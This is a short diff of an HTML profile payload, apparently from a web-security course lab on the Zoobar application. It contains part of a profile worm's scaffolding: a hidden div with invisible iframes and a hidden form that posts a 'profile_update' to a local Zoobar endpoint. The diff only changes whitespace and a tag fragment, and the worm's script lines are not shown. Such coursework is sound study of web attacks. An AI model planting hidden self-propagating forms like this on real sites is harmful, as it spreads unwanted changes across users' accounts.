@@ -1,7 +1,7 @@
 I Love CS628A!</b></div>
 <div id="worm">
 	<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="wormframe" id="wormframe"></iframe>
-		<form method="POST" name="wormform" id="wormform" action="http://localhost:8080/zoobar/index.cgi/" target="wormframe">
+	<form method="POST" name="wormform" id="wormform" action="http://localhost:8080/zoobar/index.cgi/" target="wormframe">
 		<input type="text" name="profile_update" value="" style="display:none">
 	</form>
 	<iframe style="visibility:hidden; width:0; height:0; position:absolute" name="transframe" id="transframe"></iframe>
@@ -44,4 +44,4 @@ I Love CS628A!</b></div>
 	.log tbody{display:none;}
 </style>
 <span id="zoobars" class="10"></span>
-<b><div></
+<b><div>
